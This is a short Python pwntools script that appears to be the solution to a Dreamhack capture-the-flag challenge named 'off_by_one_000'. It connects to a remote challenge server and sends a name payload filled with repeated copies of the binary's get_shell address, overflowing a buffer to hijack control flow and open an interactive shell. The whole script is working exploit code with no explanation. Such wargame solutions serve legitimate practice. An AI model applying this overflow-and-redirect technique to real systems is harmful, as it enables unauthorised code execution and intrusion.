#!/usr/bin/env python3

from pwn import *

exe = ELF("./off_by_one_000", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 22312)

    return p

def main():
    p = conn()

    # input()

    payload = p32(exe.sym['get_shell'])*64
    p.sendafter(b'Name: ', payload)

    p.interactive()

if __name__ == "__main__":
    main()